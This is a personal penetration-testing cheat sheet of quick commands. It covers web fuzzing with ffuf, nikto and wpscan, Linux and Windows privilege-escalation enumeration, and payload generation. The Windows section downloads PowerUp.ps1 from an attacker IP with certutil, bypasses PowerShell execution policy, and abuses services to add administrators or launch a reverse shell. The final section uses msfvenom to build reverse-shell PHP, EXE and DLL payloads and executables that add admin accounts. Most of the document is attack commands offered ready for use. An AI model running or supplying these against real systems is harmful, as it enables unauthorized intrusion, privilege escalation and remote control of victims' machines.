# Quickfire Bang Bang

`THESE` are all of `MY` quickfire **CMDS**!

## Web

### Subdomain fuzzing
```bash
ffuf -w ~/Seclists/Discovery/Web-Content/raft-large-directories.txt -u https://$ip/FUZZ -fc 404 -o ffufdirectories
ffuf -w ~/Seclists/Discovery/Web-Content/raft-large-words.txt -u https://$ip/FUZZ -fc 404 -o ffufwords
ffuf -w ~/Seclists/Discovery/Web-Content/raft-large-files.txt -u https://$ip/FUZZ -fc 404 -o ffuffiles
ffuf -w ~/Seclists/Discovery/Web-Content/raft-large-words.txt -u https://$ip/FUZZ -fc 404 -e php, html, csv
```

### VHost fuzzing
```bash
ffuf -w ~/Seclists -u https://$ip -H "Host: FUZZ.$ip" ~/SecLists/Discovery/DNS/subdomains-top1million-20000.txt  -ac
```

### Parameter fuzzing
```bash
ffuf -w ~/Seclists -u https://$ip/$file.php?FUZZ=a -fs 4242
ffuf -w /Seclists -u https://$ip/$file.php?$param=FUZZ -fc 401
```

### Nikto
```bash
~/binaries/nikto.pl -h http://$ip -output nikto
```

### WPscan
```bash
wpscan --url http://$ip | tee wpscanshallow
wpscan --url http://$ip -e u,vp,vt | tee wpscandeep
```

## Privilege Escalation

### Linux
```bash
id
sudo -l
crontab -l
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null
grep "CRON" /var/log/syslog OR ls -laht /etc/cron*
/usr/sbin/getcap -r / 2>/dev/null
ps aux | grep “root”
ls -a /etc/passwd

Look through root and all user directories
Look in /tmp/ – /dev/shm – /var/tmp/ – /opt/ – /srv/ – /var/mail/ – /var/spool/mail/
Look through /etc for anything that isnt root root, root cups, or root shadow
Run linpeas if you must

dpkg -l
lsblk ; mount
lsmod ; /sbin/modinfo libata
uname -a ; arch
```

### Windows
```bash
whoami /priv
certutil.exe -urlcache -split -f "http://192.168.45.191:8000/PowerUp.ps1" pu.ps1
powershell -ep bypass
Import-Module .\pu.ps1
Invoke-AllChecks
Invoke-ServiceAbuse -Name "VulnerableServiceName" -Command "net localgroup Administrators compromised_user /add"
Invoke-ServiceAbuse -Name "VulnerableServiceName" -Command "C:\Windows\Temp\reverse_shell.exe"

wmic service get name,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\"
schtasks /query /fo LIST /v
"HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select Displayname
Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }
```

## Password Bruting
```bash

```

## Misc

### RCE & LPE Binary Creation
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f raw > shell.php
msfvenom -p windows/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f exe > shell.exe
msfvenom -p windows/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f dll > shell.dll
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe > addadmin.exe
msfvenom -p windows/adduser USER=hacker PASS=ComplexP@ssw0rd! -f exe > adduser.exe
```
